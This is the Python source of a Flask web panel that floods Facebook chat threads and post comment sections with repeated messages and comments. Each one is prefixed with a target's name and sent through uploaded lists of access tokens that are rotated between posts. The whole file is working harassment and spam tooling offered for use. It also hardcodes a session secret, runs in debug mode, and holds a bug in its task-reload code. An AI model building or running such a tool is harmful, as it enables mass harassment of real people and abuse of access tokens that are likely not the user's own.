from flask import Flask, request, render_template, session, redirect, url_for, flash
import requests
from threading import Thread, Event
import time
import random
import string
import os
import sqlite3, json

app = Flask(__name__)
app.debug = True

# Secret key for sessions
app.secret_key = 'k8m2p9x7w4n6q1v5z3c8b7f2j9r4t6y1u3i5o8e2a7s9d4g6h1l3'

# Approval system state
approved_users = set()
pending_requests = set()

# Admin credentials
ADMIN_USERNAME = 'USERNAME'
ADMIN_PASSWORD = 'PASSWORD'

# ----------------- Running Tasks -----------------
running_tasks = {}  
stop_events = {}
threads = {}

# Facebook API headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j)...',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

# ----------------- SQLite DB -----------------
DB_PATH = "tasks.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS tasks (
        task_id TEXT PRIMARY KEY,
        username TEXT,
        type TEXT,
        status TEXT,
        params TEXT
    )''')
    conn.commit()
    conn.close()

def save_task(task_id, username, type_, params):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO tasks VALUES (?,?,?,?,?)",
              (task_id, username, type_, "running", json.dumps(params)))
    conn.commit()
    conn.close()

def load_running_tasks():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT task_id, username, type, params FROM tasks WHERE status='running'")
    rows = c.fetchall()
    conn.close()
    return rows

def update_task_status(task_id, status):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE tasks SET status=? WHERE task_id=?", (status, task_id))
    conn.commit()
    conn.close()

# ----------------- Helpers -----------------
def get_user_id():
    # Browser/session-based user ID
    if 'username' not in session:
        # generate random session ID for new browser
        session['username'] = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return session['username']

# ----------------- Middleware -----------------
@app.before_request
def check_approval():
    path = (request.path or '/')
    if path.startswith('/static') or path == '/favicon.ico':
        return
    if path.startswith('/admin'):
        if path == '/admin/login':
            return
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return
    if path.startswith('/approval'):
        return
    if session.get('admin_logged_in'):
        return
    user_id = get_user_id()
    if user_id not in approved_users:
        return redirect(url_for('approval_request'))

# ----------------- Home -----------------
@app.route('/')
def home():
    return render_template("home.html")

# ----------------- Convo Task -----------------
@app.route('/convo', methods=['GET','POST'])
def convo():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()
        username = session.get("username", get_user_id())
        running_tasks.setdefault(username, {})[task_id] = {"type": "convo", "status": "running"}
        save_task(task_id, username, "convo", {
            "tokens": access_tokens,
            "thread_id": thread_id,
            "mn": mn,
            "interval": time_interval,
            "messages": messages
        })
        flash(f"Convo task {task_id} started!", "success")
        return redirect(url_for("my_tasks"))
    return render_template("convo_form.html")

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                requests.post(api_url, data=parameters, headers=headers)
                time.sleep(time_interval)

# ----------------- Post Task -----------------
@app.route('/post', methods=['GET','POST'])
def post():
    if request.method == 'POST':
        count = int(request.form.get('count', 0))
        for i in range(1, count + 1):
            post_id = request.form.get(f"id_{i}")
            hname = request.form.get(f"hatername_{i}")
            delay = request.form.get(f"delay_{i}")
            token_file = request.files.get(f"token_{i}")
            msg_file = request.files.get(f"comm_{i}")
            if not (post_id and hname and delay and token_file and msg_file):
                flash(f"Missing required fields for post #{i}", "error")
                return redirect(url_for("post"))
            tokens = token_file.read().decode().strip().splitlines()
            comments = msg_file.read().decode().strip().splitlines()
            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
            stop_events[task_id] = Event()
            thread = Thread(target=post_comments, args=(post_id, tokens, comments, hname, int(delay), task_id))
            thread.start()
            threads[task_id] = thread
            username = session.get("username", get_user_id())
            running_tasks.setdefault(username, {})[task_id] = {"type": "post", "status": "running"}
            save_task(task_id, username, "post", {
                "post_id": post_id,
                "tokens": tokens,
                "comments": comments,
                "hname": hname,
                "delay": int(delay)
            })
        flash(f"{count} Post tasks started!", "success")
        return redirect(url_for("my_tasks"))
    return render_template("post_form.html")

def post_comments(post_id, tokens, comments, hname, delay, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    while not stop_event.is_set():
        comment = f"{hname} {random.choice(comments)}"
        token = tokens[token_index % len(tokens)]
        url = f"https://graph.facebook.com/{post_id}/comments"
        requests.post(url, data={"message": comment, "access_token": token})
        token_index += 1
        time.sleep(delay)

# ----------------- Stop Task by ID -----------------
@app.route("/stop_task_by_id", methods=["POST"])
def stop_task_by_id():
    username = session.get("username", get_user_id())
    task_id = request.form.get("task_id")
    user_tasks = running_tasks.get(username, {})
    if task_id in user_tasks:
        if task_id in stop_events:
            stop_events[task_id].set()
        user_tasks.pop(task_id)
        update_task_status(task_id, "stopped")
        flash(f"Task {task_id} stopped!", "success")
    else:
        flash(f"Task ID {task_id} not found.", "error")
    return redirect(url_for("my_tasks"))

# ----------------- Stop Task (User/Admin) -----------------
@app.route("/stop_task/<username>/<task_id>")
def stop_task(username, task_id):
    if not session.get("admin_logged_in") and session.get("username") != username:
        return "Unauthorized", 403
    user_tasks = running_tasks.get(username, {})
    if task_id in user_tasks:
        if task_id in stop_events:
            stop_events[task_id].set()
        user_tasks.pop(task_id)
        update_task_status(task_id, "stopped")
        flash(f"Task {task_id} stopped!", "success")
    return redirect(url_for("my_tasks"))

# ----------------- User Tasks Page -----------------
@app.route("/my_tasks")
def my_tasks():
    username = session.get("username", get_user_id())
    user_tasks = running_tasks.get(username, {})
    return render_template("my_tasks.html", username=username, tasks=user_tasks)

# ----------------- Admin & Approval routes -----------------
@app.route('/approval_request', methods=['GET', 'POST'])
def approval_request():
    user_id = get_user_id()
    if user_id in approved_users or session.get('admin_logged_in'):
        return redirect(url_for('home'))
    if request.method == 'POST':
        if user_id not in pending_requests:
            pending_requests.add(user_id)
            return render_template('approval_sent.html')
        else:
            return render_template('approval_request.html', already_requested=True)
    return render_template('approval_request.html')

@app.route('/approval_sent')
def approval_sent():
    return render_template('approval_sent.html')

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if session.get('admin_logged_in'):
        return redirect(url_for('admin_panel'))
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            session.permanent = True
            return redirect(url_for('admin_panel'))
        else:
            flash("Invalid credentials", "error")
    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('home'))

@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    return render_template(
        'admin_panel.html',
        pending_requests=list(pending_requests),
        approved_users=list(approved_users)
    )

@app.route('/admin/tasks')
def admin_tasks():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    return render_template("admin_tasks.html", running_tasks=running_tasks)

@app.route('/admin/approve/<user_id>')
def approve_user(user_id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    if user_id in pending_requests:
        pending_requests.remove(user_id)
        approved_users.add(user_id)
    return redirect(url_for('admin_panel'))

@app.route('/admin/reject/<user_id>')
def reject_user(user_id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    if user_id in pending_requests:
        pending_requests.remove(user_id)
    return redirect(url_for('admin_panel'))

@app.route('/admin/remove/<user_id>')
def remove_user(user_id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    if user_id in approved_users:
        approved_users.remove(user_id)
    return redirect(url_for('admin_panel'))

# ----------------- Self-Ping Feature -----------------
def self_ping():
    url = "https://cha7-upda7ed.onrender.com"
    while True:
        try:
            requests.get(url)
            print("🌐 Self-ping successful")
        except:
            print("⚠️ Self-ping failed")
        time.sleep(300)

# ----------------- Startup -----------------
if __name__ == '__main__':
    init_db()

    # Reload running tasks from DB
    for task_id, username, type_, params in load_running_tasks():
        params = json.loads(params)
        stop_events[task_id] = Event()

        if type_ == "convo":
            thread = Thread(target=send_messages,
                            args=(params["tokens"], params["thread_id"],
                                  params["mn"], params["interval"],
                                  params["messages"], task_id))
        elif type_ == "post":
            thread = Thread(target=post_comments,
                            args=(params["post_id"], params["tokens"],
                                  params["comments"], params["hname"],
                                  params["delay"], task_id
                                  , task_id))
        threads[task_id] = thread
        thread.start()
        running_tasks.setdefault(username, {})[task_id] = {"type": type_, "status": "running"}

    # Start self-ping thread
    ping_thread = Thread(target=self_ping, daemon=True)
    ping_thread.start()


    app.run(host='0.0.0.0', port=10000)
